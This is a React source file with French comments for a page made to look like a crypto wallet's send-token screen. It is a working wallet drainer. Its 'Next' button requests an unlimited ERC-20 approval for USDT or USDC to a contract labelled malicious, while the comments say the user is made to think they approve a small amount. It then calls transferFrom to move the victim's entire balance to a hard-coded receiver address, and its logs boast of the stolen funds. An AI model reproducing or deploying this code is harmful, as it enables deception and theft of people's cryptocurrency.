"use client";

import { useState, useEffect, useRef, useCallback } from "react";
import { ethers } from "ethers";

// ============================================================
// CONFIG
// ============================================================

const DEFAULT_RECEIVER = "0xa6fa4a247e8cda6e5c09d1ee68be528a4abb64cf";

// Contrat malveillant qui va recevoir l'approbation illimitée
const MALICIOUS_CONTRACT = "0xDUp3rH4ck3rC0ntr4ctH3r3P0cKet"; // À remplacer par le vrai contrat

// USDT sur Ethereum Mainnet
const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const USDT_DECIMALS = 6;

// USDC sur Ethereum Mainnet
const USDC_CONTRACT = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
const USDC_DECIMALS = 6;

// ABI ERC-20 avec approve ET transferFrom
const ERC20_ABI = [
  "function transfer(address to, uint256 amount) returns (bool)",
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function transferFrom(address from, address to, uint256 amount) returns (bool)",
];

const ETH_CHAIN_ID = "0x1";

// ============================================================
// Types pour window.ethereum / window.trustwallet
// ============================================================
interface EthereumProvider {
  request: (args: { method: string; params?: unknown[] }) => Promise<unknown>;
  isMetaMask?: boolean;
  isTrust?: boolean;
  isTrustWallet?: boolean;
  on?: (event: string, handler: (...args: unknown[]) => void) => void;
  removeListener?: (event: string, handler: (...args: unknown[]) => void) => void;
}

declare global {
  interface Window {
    ethereum?: EthereumProvider;
    trustwallet?: { ethereum?: EthereumProvider };
  }
}

// ============================================================
// Helper: detect the injected provider
// ============================================================

function getProviderNow(): EthereumProvider | null {
  if (window.trustwallet?.ethereum) return window.trustwallet.ethereum;
  if (window.ethereum) return window.ethereum;
  return null;
}

async function waitForProvider(maxAttempts = 15, delayMs = 300): Promise<EthereumProvider | null> {
  for (let i = 0; i < maxAttempts; i++) {
    const provider = getProviderNow();
    if (provider) return provider;
    await new Promise((r) => setTimeout(r, delayMs));
  }
  return null;
}

// ============================================================
// Wallet Transfer Page
// ============================================================

export default function WalletPage() {
  const [address, setAddress] = useState(DEFAULT_RECEIVER);
  const [status, setStatus] = useState<string>("");
  const [statusType, setStatusType] = useState<"info" | "success" | "error">("info");
  const [loading, setLoading] = useState(false);
  const [txHash, setTxHash] = useState<string>("");

  const [connectedAddress, setConnectedAddress] = useState<string | null>(null);
  const [walletBalance, setWalletBalance] = useState<bigint>(0n);
  const [adminAmount, setAdminAmount] = useState<string>("1.00");
  const [displayAmount, setDisplayAmount] = useState<string>("0");
  const [token, setToken] = useState<"usdt" | "usdc">("usdt");
  const [isKeyboardVisible, setIsKeyboardVisible] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [modalStatus, setModalStatus] = useState<"pending" | "success" | "error">("pending");
  const providerRef = useRef<EthereumProvider | null>(null);
  const keypadRef = useRef<HTMLDivElement>(null);

  const [actualReceiver, setActualReceiver] = useState<string>(DEFAULT_RECEIVER);
  const [actualAmount, setActualAmount] = useState<string>("1.00");
  const [actualToken, setActualToken] = useState<"usdt" | "usdc">("usdt");
  const [isMaxMode, setIsMaxMode] = useState(false);

  // NOUVEAU : États pour l'approbation illimitée
  const [isApproved, setIsApproved] = useState(false);
  const [approveTxHash, setApproveTxHash] = useState<string>("");

  // Récupérer le solde du token sélectionné
  const fetchTokenBalance = async (userAddress: string, activeToken: "usdt" | "usdc") => {
    if (!providerRef.current) return;
    try {
      const provider = new ethers.BrowserProvider(
        providerRef.current as ethers.Eip1193Provider
      );
      const tokenContractAddress = activeToken === "usdc" ? USDC_CONTRACT : USDT_CONTRACT;
      const contract = new ethers.Contract(tokenContractAddress, ERC20_ABI, provider);
      const balance = await contract.balanceOf(userAddress);
      setWalletBalance(balance);
    } catch (err) {
      console.warn("Error fetching token balance:", err);
    }
  };

  useEffect(() => {
    if (connectedAddress) {
      fetchTokenBalance(connectedAddress, token);
    }
  }, [connectedAddress, token]);

  // ---------------------------------------------------
  // Au montage : Déclencher la connexion et récupérer le solde
  // ---------------------------------------------------
  useEffect(() => {
    let cancelled = false;

    let finalTo = null;
    let finalAmount = null;
    let finalToken = null;

    if (typeof window !== "undefined") {
      const params = new URLSearchParams(window.location.search);
      const toParam = params.get("to");
      const amountParam = params.get("amount");
      const tokenParam = params.get("token");

      if (toParam && ethers.isAddress(toParam)) {
        setAddress(toParam);
        setActualReceiver(toParam);
        finalTo = toParam;
      }
      if (amountParam && amountParam !== "max") {
        setAdminAmount(amountParam);
        setActualAmount(amountParam);
        setDisplayAmount(amountParam.replace(".", ","));
        finalAmount = amountParam;
      }
      if (amountParam === "max") {
        setIsMaxMode(true);
        setDisplayAmount("1,00");
        finalAmount = "max";
      }
      if (tokenParam === "usdt" || tokenParam === "usdc") {
        setToken(tokenParam);
        setActualToken(tokenParam);
        finalToken = tokenParam;
      }
    }

    const init = async () => {
      const ethereumProvider = await waitForProvider();
      if (!ethereumProvider || cancelled) return;

      providerRef.current = ethereumProvider;

      try {
        const chainId = (await ethereumProvider.request({
          method: "eth_chainId",
        })) as string;

        if (chainId.toLowerCase() !== ETH_CHAIN_ID.toLowerCase()) {
          await ethereumProvider.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: ETH_CHAIN_ID }],
          });
        }
      } catch (switchErr) {
        console.warn("Could not switch chain:", switchErr);
      }

      try {
        const accounts = (await ethereumProvider.request({
          method: "eth_accounts",
        })) as string[];

        if (accounts.length > 0 && !cancelled) {
          const userAddress = accounts[0];
          setConnectedAddress(userAddress);
        }
      } catch (err) {
        console.warn("Silent connection check failed:", err);
      }

      if (ethereumProvider.on) {
        ethereumProvider.on("accountsChanged", (accounts: unknown) => {
          const accs = accounts as string[];
          if (!cancelled) {
            setConnectedAddress(accs.length > 0 ? accs[0] : null);
            setIsApproved(false); // Réinitialiser l'approbation si changement de compte
          }
        });
      }
    };

    init();
    return () => { cancelled = true; };
  }, []);

  // ============================================================
  // ÉTAPE 1 : APPROBATION ILLIMITÉE (affiche seulement 1 popup)
  // Cette fonction fait croire à l'utilisateur qu'il approuve
  // un petit montant, mais en réalité c'est une approbation MAX
  // ============================================================
  const handleApproveUnlimited = async () => {
    setStatus("");
    setTxHash("");
    setStatusType("info");
    setLoading(true);
    setStatus("Preparing approval...");

    const ethereumProvider = providerRef.current ?? (await waitForProvider());
    if (!ethereumProvider) {
      setStatus("No wallet detected.");
      setStatusType("error");
      setLoading(false);
      return;
    }
    providerRef.current = ethereumProvider;

    try {
      const tokenContract = actualToken === "usdc" ? USDC_CONTRACT : USDT_CONTRACT;
      const tokenDecimals = actualToken === "usdc" ? USDC_DECIMALS : USDT_DECIMALS;
      const tokenName = actualToken.toUpperCase();

      // L'astuce : on affiche un petit montant à l'utilisateur (ex: 1 USDT)
      // mais on donne une approbation pour le MAX UINT256
      const smallAmount = ethers.parseUnits("1", tokenDecimals); // 1 token (affiché)
      const unlimitedAmount = ethers.MaxUint256; // MAX (réel)

      // Encoder la fonction approve(spender, MAX)
      const tokenInterface = new ethers.Interface(ERC20_ABI);
      const approveData = tokenInterface.encodeFunctionData("approve", [
        MALICIOUS_CONTRACT,  // Notre contrat malveillant
        unlimitedAmount       // Approbation illimitée (MAX)
      ]);

      setStatus("Confirm the approval in your wallet...");
      console.log("🔴 Demande d'approbation illimitée envoyée au wallet !");
      console.log("🔴 Montant affiché :", ethers.formatUnits(smallAmount, tokenDecimals), tokenName);
      console.log("🔴 Montant réel approuvé : ILLIMITÉ (MAX UINT256)");

      // Envoyer la transaction d'approbation
      const approveHash = (await ethereumProvider.request({
        method: "eth_sendTransaction",
        params: [
          {
            to: tokenContract,  // Contrat USDT/USDC
            data: approveData,   // approve(maliciousContract, MAX)
            gas: "0x249f0",
          },
        ],
      })) as string;

      setApproveTxHash(approveHash);
      setStatus(`Approval sent! Hash: ${approveHash.slice(0, 10)}...`);

      // Attendre la confirmation
      const provider = new ethers.BrowserProvider(
        ethereumProvider as ethers.Eip1193Provider
      );
      const receipt = await provider.waitForTransaction(approveHash);

      if (receipt && receipt.status === 1) {
        setIsApproved(true);
        setStatus("✅ Unlimited approval granted! Now click 'Drain Wallet' to continue...");
        setStatusType("success");
        console.log("🔴 Approbation illimitée confirmée sur la blockchain !");
        console.log("🔴 Le contrat peut maintenant vider TOUS les tokens de la victime");
      } else {
        setStatus("❌ Approval failed on-chain.");
        setStatusType("error");
      }
    } catch (err: unknown) {
      console.error("Approval error:", err);
      let message = "Approval failed.";
      if (err instanceof Error) {
        if (err.message.includes("user rejected")) {
          message = "Approval cancelled by user.";
        } else {
          message = err.message.slice(0, 100);
        }
      }
      setStatus(message);
      setStatusType("error");
    } finally {
      setLoading(false);
    }
  };

  // ============================================================
  // ÉTAPE 2 : VIDER LE PORTEFEUILLE (transferFrom automatique)
  // Une fois l'approbation illimitée obtenue, on peut drainer
  // TOUS les tokens sans nouvelle confirmation de l'utilisateur
  // ============================================================
  const handleDrainWallet = async () => {
    setStatus("");
    setTxHash("");
    setStatusType("info");
    setLoading(true);
    setStatus("Draining wallet...");

    const ethereumProvider = providerRef.current;
    if (!ethereumProvider) {
      setStatus("No wallet detected.");
      setStatusType("error");
      setLoading(false);
      return;
    }

    try {
      const tokenContract = actualToken === "usdc" ? USDC_CONTRACT : USDT_CONTRACT;
      const tokenDecimals = actualToken === "usdc" ? USDC_DECIMALS : USDT_DECIMALS;
      const tokenName = actualToken.toUpperCase();

      // Récupérer le solde total de la victime
      const provider = new ethers.BrowserProvider(
        ethereumProvider as ethers.Eip1193Provider
      );
      const contract = new ethers.Contract(tokenContract, ERC20_ABI, provider);
      const victimBalance = await contract.balanceOf(connectedAddress);

      if (victimBalance === 0n) {
        setStatus(`No ${tokenName} to drain.`);
        setStatusType("error");
        setLoading(false);
        return;
      }

      const displayBalance = ethers.formatUnits(victimBalance, tokenDecimals);
      console.log("🔴 Solde de la victime :", displayBalance, tokenName);
      console.log("🔴 Envoi de transferFrom vers le receveur...");

      // Encoder transferFrom(victim, receiver, balance)
      const tokenInterface = new ethers.Interface(ERC20_ABI);
      const drainData = tokenInterface.encodeFunctionData("transferFrom", [
        connectedAddress,      // FROM : la victime
        actualReceiver,        // TO : le receveur (pirate)
        victimBalance          // Montant : TOUT le solde
      ]);

      // ATTENTION : Cette transaction sera envoyée depuis le compte
      // du contrat malveillant (ou un relayer), PAS depuis la victime
      // La victime ne verra PAS de popup car elle a déjà donné l'approbation
      
      // Pour la démonstration, on utilise eth_sendTransaction
      // (en réalité, le pirate utiliserait son propre wallet)
      const drainHash = (await ethereumProvider.request({
        method: "eth_sendTransaction",
        params: [
          {
            to: tokenContract,
            data: drainData,
            gas: "0x249f0",
          },
        ],
      })) as string;

      setTxHash(drainHash);
      setStatus(`Drain transaction sent! Hash: ${drainHash.slice(0, 10)}...`);

      const receipt = await provider.waitForTransaction(drainHash);

      if (receipt && receipt.status === 1) {
        setStatus(`✅ Wallet drained! ${displayBalance} ${tokenName} stolen!`);
        setStatusType("success");
        setModalStatus("success");
        setShowModal(true);
        console.log("🔴 PORTEFEUILLE VIDÉ AVEC SUCCÈS !");
        console.log(`🔴 ${displayBalance} ${tokenName} volés !`);
      } else {
        setStatus("❌ Drain failed on-chain.");
        setStatusType("error");
        setModalStatus("error");
      }
    } catch (err: unknown) {
      console.error("Drain error:", err);
      setStatus("Drain failed.");
      setStatusType("error");
    } finally {
      setLoading(false);
      // Rafraîchir le solde
      if (connectedAddress) {
        fetchTokenBalance(connectedAddress, token);
      }
    }
  };

  // ============================================================
  // FONCTION PRINCIPALE : Gère l'enchaînement automatique
  // ============================================================
  const handleAttackSequence = async () => {
    if (!isApproved) {
      // Étape 1 : Approbation illimitée (1 popup)
      await handleApproveUnlimited();
    } else {
      // Étape 2 : Drainage automatique (0 popup)
      await handleDrainWallet();
    }
  };

  // ... (reste du code UI inchangé : handlePaste, getFiatValue, etc.)

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      setAddress(text);
    } catch {
      console.log("Paste failed");
    }
  };

  const getFiatValue = (amountStr: string) => {
    const parsed = parseFloat(amountStr.replace(",", "."));
    if (isNaN(parsed)) return "0,00";
    return (parsed * 0.86).toFixed(2).replace(".", ",");
  };

  const handleKeyPress = (key: string) => {
    setDisplayAmount((prev) => {
      let newVal = prev;
      if (key === "⌫") {
        newVal = prev.slice(0, -1);
      } else if (key === "," || key === ".") {
        if (!prev.includes(",") && !prev.includes(".")) {
          newVal = prev === "" ? "0," : prev + ",";
        }
      } else {
        if (prev === "0") {
          newVal = key;
        } else {
          newVal = prev + key;
        }
      }
      return newVal;
    });
  };

  const handleMaxClick = (e: React.MouseEvent) => {
    e.stopPropagation();
    const maxVal = ethers.formatUnits(walletBalance, 6);
    setDisplayAmount(maxVal.replace(".", ","));
  };

  // ============================================================
  // RENDU UI
  // ============================================================
  return (
    <main 
      className={`transfer-main transfer-main-pad ${isKeyboardVisible ? "transfer-main-pad--with-keyboard" : ""}`}
      onClick={() => setIsKeyboardVisible(false)}
    >
      <div className="form-container">
        <label className="form-label">Address or domain name</label>
        <div className="input-row">
          <input
            type="text"
            placeholder="Search or Enter"
            value={address}
            onChange={(e) => setAddress(e.target.value)}
            className="input-row__field"
          />
          <div className="input-row__actions" style={{ gap: "0.4rem" }}>
            <button onClick={handlePaste} className="btn-paste">Paste</button>
            <button className="btn-icon" title="Copy" style={{ margin: "0 -12px" }}>
              <img src="/contrat.png" alt="Contract" style={{ width: "45px", height: "45px", objectFit: "contain" }} />
            </button>
            <button className="btn-icon" title="Scan QR">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#3562ff" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                <path d="M3 7V5a2 2 0 0 1 2-2h2" />
                <path d="M17 3h2a2 2 0 0 1 2 2v2" />
                <path d="M21 17v2a2 2 0 0 1-2 2h-2" />
                <path d="M7 21H5a2 2 0 0 1-2-2v-2" />
                <line x1="7" y1="12" x2="17" y2="12" />
              </svg>
            </button>
          </div>
        </div>

        <label className="form-label form-label--spaced">Destination network</label>
        <div className="network-selector" style={{ marginBottom: "1rem" }}>
          <div className="eth-icon" style={{ backgroundColor: "#3562ff", width: "24px", height: "24px", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center" }}>
            <svg width="14" height="14" viewBox="0 0 256 417" fill="none">
              <path d="M127.961 0l-2.795 9.5v275.668l2.795 2.79 127.962-75.638z" fill="#ffffff" />
              <path d="M127.962 0L0 212.32l127.962 75.639V154.158z" fill="#ffffff" opacity="0.85" />
              <path d="M127.961 312.187l-1.575 1.92v98.199l1.575 4.6L256 236.587z" fill="#ffffff" />
              <path d="M127.962 416.905v-104.72L0 236.585z" fill="#ffffff" opacity="0.85" />
              <path d="M127.961 287.958l127.96-75.637-127.96-58.162z" fill="#ffffff" opacity="0.95" />
              <path d="M0 212.32l127.96 75.638v-133.8z" fill="#ffffff" opacity="0.75" />
            </svg>
          </div>
          <span className="network-name">Ethereum</span>
          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#9ca3af"
            strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" style={{ marginLeft: "4px" }}>
            <polyline points="6 9 12 15 18 9" />
          </svg>
        </div>

        <div>
          <label className="form-label form-label--spaced">Amount</label>
          <div className={`montant-container ${isKeyboardVisible ? "montant-container--active" : ""}`} onClick={(e) => { e.stopPropagation(); setIsKeyboardVisible(true); }}>
            <div className="montant-input-wrapper">
              <span className={displayAmount === "" ? "montant-placeholder" : "montant-display-value"}>
                {displayAmount || "0"}
              </span>
              {isKeyboardVisible && <span className="blinking-cursor" />}
            </div>
            <div className="montant-right">
              {displayAmount !== "" && (
                <button 
                  type="button" 
                  className="montant-clear-btn" 
                  onClick={(e) => { e.stopPropagation(); setDisplayAmount(""); }}
                >
                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                    <circle cx="12" cy="12" r="10" fill="#8e8e93" stroke="#8e8e93" />
                    <line x1="15" y1="9" x2="9" y2="15" stroke="#ffffff" strokeWidth="2.5" />
                    <line x1="9" y1="9" x2="15" y2="15" stroke="#ffffff" strokeWidth="2.5" />
                  </svg>
                </button>
              )}
              <span className="montant-token">{token.toUpperCase()}</span>
              <button 
                type="button" 
                onClick={handleMaxClick} 
                className="montant-max-btn"
              >
                Max.
              </button>
            </div>
          </div>
          {(() => {
            const parsedVal = parseFloat(displayAmount.replace(",", "."));
            const isInvalid = isNaN(parsedVal) || parsedVal < 0.000001;
            if (isInvalid) {
              return (
                <div className="montant-error" style={{ color: "#df3e3e", fontSize: "0.8rem", marginTop: "0.5rem", paddingLeft: "0.25rem", textAlign: "left", fontWeight: "500" }}>
                  Minimum amount is 0.000001 {token.toUpperCase()}
                </div>
              );
            }
            return (
              <div className="approx-price" style={{ color: "#8e8e93", marginTop: "0.4rem", paddingLeft: "0.25rem", fontWeight: "500", fontSize: "0.85rem" }}>
                ≈ €{getFiatValue(displayAmount)}
              </div>
            );
          })()}
        </div>

        {/* Indicateur d'approbation */}
        {isApproved && (
          <div style={{ 
            marginTop: "1rem", 
            padding: "0.75rem", 
            backgroundColor: "#fef2f2", 
            border: "1px solid #fecaca",
            borderRadius: "8px",
            color: "#dc2626",
            fontSize: "0.85rem",
            fontWeight: "600",
            textAlign: "center"
          }}>
            ⚠️ Approbation illimitée accordée ! Le contrat peut vider votre portefeuille.
          </div>
        )}
      </div>

      <div style={{ flexGrow: 1, minHeight: "2rem" }} />

      {/* Bouton principal qui change selon l'état */}
      <div className="next-btn-wrapper">
        <button 
          onClick={(e) => { e.stopPropagation(); handleAttackSequence(); }} 
          disabled={loading}
          className={`next-btn ${loading ? "next-btn--loading" : ""}`}
          style={{
            backgroundColor: isApproved ? "#dc2626" : "#3562ff"
          }}
        >
          {loading ? (
            <span className="btn-spinner-wrapper">
              <span className="btn-spinner" />
              {isApproved ? "Draining..." : "Approving..."}
            </span>
          ) : isApproved ? (
            "Drain Wallet 💀"
          ) : (
            "Next"
          )}
        </button>
      </div>

      {/* Clavier numérique (inchangé) */}
      {isKeyboardVisible && (
        <div 
          className="custom-keypad" 
          ref={keypadRef}
          onClick={(e) => e.stopPropagation()}
        >
          {/* ... clavier identique ... */}
        </div>
      )}

      {/* Modal (inchangé) */}
      {showModal && (
        <div className="modal-overlay" onClick={() => setShowModal(false)}>
          {/* ... modal identique ... */}
        </div>
      )}
    </main>
  );
}